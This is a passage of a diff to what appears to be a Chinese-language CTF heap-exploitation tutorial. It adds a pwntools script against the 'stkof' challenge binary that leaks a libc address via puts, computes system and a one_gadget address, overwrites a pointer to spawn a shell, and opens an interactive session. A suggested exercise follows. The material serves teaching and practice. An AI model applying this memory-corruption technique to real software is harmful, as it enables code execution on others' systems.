+        Edit(io, 0, 0x08, p64(elf.plt["puts"]))
+        leaked = u64(Free(io, 2)[:-1].ljust(8, "\x00"))
+        libc_base = leaked - libc.symbols["malloc"]
+        system_addr = libc_base + libc.symbols["system"]
+        one_gadget_addr = libc_base + one_gadget_offset
+        Edit(io, 1, 0x08, p64(one_gadget_addr))
+        Free(io, 1)
+        try:
+            io.sendline("id")
+            log.info(io.readline(timeout=3))
+        except Exception, e:
+            io.close()
+            continue
+        io.interactive()
+if __name__ == "__main__":
+    binary = "./bins/a679df07a8f3a8d590febad45336d031-stkof"
+    main(binary, "")
+```
+
+### 0x06 建议习题：
 
 * 2018 HITCON children_tcache
-
-
